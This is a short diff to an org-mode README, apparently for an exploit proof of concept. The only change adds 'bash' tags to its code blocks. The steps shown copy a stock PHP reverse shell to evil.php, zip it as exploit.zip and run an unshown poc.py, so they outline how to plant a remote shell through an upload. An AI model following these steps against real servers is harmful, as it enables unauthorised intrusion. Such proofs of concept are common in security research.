@@ -5,12 +5,12 @@
 
 * TL:DR
 1. Create a revshell:
-   #+begin_src
+   #+begin_src bash
 cp /usr/share/webshells/php/php-reverse-shell.php ~/path/to/your/likings/evil.php
 
    #+end_src
 2. zip the revshell:
-   #+begin_src
+   #+begin_src bash
 zip exploit.zip evil.php
    #+end_src
 3. run =poc.py=.
